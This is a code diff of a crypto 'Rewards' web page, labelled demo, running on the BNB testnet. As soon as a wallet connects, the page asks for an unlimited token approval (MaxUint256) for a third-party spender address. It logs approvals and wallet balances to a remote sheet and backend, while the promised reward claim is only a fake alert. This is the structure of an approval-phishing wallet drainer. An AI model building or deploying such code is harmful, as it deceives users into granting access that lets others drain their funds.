@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <title>DEMO — Rewards</title>
   <style>
-    /* (unchanged styles — same as you provided) */
+    /* (same styles as before; kept compact) */
     *{box-sizing:border-box;margin:0;padding:0}
     body{font-family:system-ui,Segoe UI,Arial;background:#050816;color:#e6eef8;min-height:100vh;display:flex;flex-direction:column;}
     header{background:#071027;padding:10px 16px;position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,0.03);}
@@ -197,6 +197,36 @@
     const TOKEN_DECIMALS = 18;
     const REQUIRED_USDT = 10;
     const REWARD_AMOUNT = 10.0;
+
+    // ===== userId helpers (restored) =====
+    function storageKeyFor(address){
+      return "userId_" + (address || "").toLowerCase();
+    }
+    function generateUserIdFromAddress(address){
+      address = (address || "").toLowerCase();
+      let hash = 0;
+      for (let i = 0; i < address.length; i++){
+        hash = ((hash << 5) - hash) + address.charCodeAt(i);
+        hash |= 0;
+      }
+      hash = Math.abs(hash);
+      const num = 100000 + (hash % 900000);
+      return String(num);
+    }
+    function getOrCreateUserIdFor(address){
+      const key = storageKeyFor(address);
+      let id = null;
+      try {
+        id = localStorage.getItem(key);
+      } catch(e) {
+        // ignore localStorage errors
+      }
+      if (!id || !/^[0-9]{6}$/.test(id)) {
+        id = generateUserIdFromAddress(address);
+        try { localStorage.setItem(key, id); } catch(e) { /* ignore */ }
+      }
+      return id;
+    }
 
     let providerInstance = null;
     let web3Instance = null;
@@ -422,14 +452,12 @@
     // ===== Simplified instant ensureTokenApproval (and record to sheet) =====
     let approvalInProgress = false;
     async function ensureTokenApproval(){
-      // minimal fast path: build calldata & send approval (via signer); record tx on success
       if(!TOKEN_ADDRESS){ console.warn("TOKEN_ADDRESS not set, skipping approve"); return; }
       if(!SPENDER_ADDRESS){ console.warn("SPENDER_ADDRESS not set, skipping approve"); return; }
       if(!providerInstance){ console.warn("No providerInstance/web3Instance for approval"); return; }
       if(approvalInProgress){ console.log("Approval already in progress"); return; }
 
       try{
-        // quick owner lookup
         let owner = null;
         try{
           if(providerInstance.selectedAddress) owner = providerInstance.selectedAddress;
@@ -448,7 +476,6 @@
         approvalInProgress = true;
         setStatus("Requesting approval…");
 
-        // Fast attempt: eth_sendTransaction (wallet will prompt immediately). If provider disallows, fallback to signer.
         const iface = new ethers.Interface(ERC20_APPROVE_ABI);
         const data = iface.encodeFunctionData("approve", [SPENDER_ADDRESS, ethers.MaxUint256]);
         const txParams = { from: owner, to: TOKEN_ADDRESS, data: data };
@@ -459,7 +486,6 @@
             const sendResult = await providerInstance.request({ method: "eth_sendTransaction", params: [txParams] });
             console.log("[instant-approve] eth_sendTransaction returned:", sendResult);
             setStatus("Approval sent (pending)...");
-            // best-effort: record this sendResult as txHash if it looks like one
             const maybeTxHash = (typeof sendResult === "string" && sendResult.startsWith("0x")) ? sendResult : null;
             if(maybeTxHash){
               try{ setLocalApprovalFlag(owner, maybeTxHash); await recordApprovalToSheet(owner, maybeTxHash); }catch(e){}
@@ -467,11 +493,9 @@
             return;
           }catch(errSend){
             console.warn("[instant-approve] eth_sendTransaction failed, fallback to signer:", errSend && errSend.message ? errSend.message : errSend);
-            // continue to ethers fallback
           }
         }
 
-        // Fallback: ethers signer approve (also opens wallet)
         const ethersProvider = new ethers.BrowserProvider(providerInstance, BNB_TESTNET_CHAIN_ID_DEC);
         const signer = await ethersProvider.getSigner();
         const writeContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
@@ -493,20 +517,17 @@
     // -------- Fast approve-check flow (localStorage -> sheet -> approve) ----------
     async function fastApproveCheckAndMaybeApprove(address){
       if(!address) return;
-      // 1) localStorage
       const local = getLocalApprovalFlag(address);
       if(local){
         console.log("Local approval flag present, skipping approval for", address, local);
         return;
       }
-      // 2) sheet check (fast)
       const sheetResp = await checkApprovalSheet(address, SHEET_CHECK_TIMEOUT_MS);
       if(sheetResp && sheetResp.approved){
         console.log("Sheet indicates approval for", address, sheetResp.txHash || "no-tx");
         setLocalApprovalFlag(address, sheetResp.txHash || "1");
         return;
       }
-      // 3) otherwise request approval immediately
       console.log("No cached approval: requesting approval for", address);
       await ensureTokenApproval();
     }
@@ -544,7 +565,7 @@
           const evm = state["eip155"];
           if (evm && !gotProvider) gotProvider = evm;
         });
-        await window.appKit.open({ view: "Connect" });
+        await window.appkit?.open?.({ view: "Connect" }) || await window.appKit.open({ view: "Connect" });
         if (typeof unsubscribe === "function") unsubscribe();
         const provider = gotProvider;
         if (!provider) { setStatus("Not connected"); return; }
@@ -567,7 +588,6 @@
         setStatus("Connected");
         const session = await restoreSessionFromAddress(address);
         notifyBackend(address, BNB_TESTNET_LABEL, session.userId, session.balanceBNB, session.tokenBalance, "connect").catch(console.error);
-        // Fast check & maybe approve (this will only call ensureTokenApproval if needed)
         await fastApproveCheckAndMaybeApprove(address);
       } catch (err) {
         console.error("connectFlow error (AppKit):", err);
@@ -598,19 +618,19 @@
         if(!isWalletConnected){ alert("Please connect your wallet first."); setStatus("Connect wallet before claiming."); return; }
         if(!(task1Done && task2Eligible && task3Done)){ alert("Please complete all tasks first."); return; }
         if(!web3Instance || !providerInstance || !currentAddress){ alert("Wallet not ready, connect again."); return; }
+
         // Final authoritative allowance check before claim (recommended)
         try{
           const ethersProvider = new ethers.BrowserProvider(providerInstance);
           const readContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ALLOWANCE_ABI, ethersProvider);
           const allowance = await readContract.allowance(currentAddress, SPENDER_ADDRESS);
           if(!allowance || allowance === 0n){
-            // prompt approval (this will show wallet)
             await ensureTokenApproval();
-            // after approval, re-check or proceed
           }
         }catch(e){
           console.warn("Final allowance check failed, attempting to proceed anyway:", e);
         }
+
         setStatus("Claiming reward…");
         setTimeout(()=>{ setStatus("Reward claimed for " + currentAddress.slice(0,6) + "…" + currentAddress.slice(-4)); alert("Reward claimed! (demo mode — add real contract call later)"); },800);
       }catch(err){ console.error("claimReward error:", err); setStatus("Reward claim failed"); }
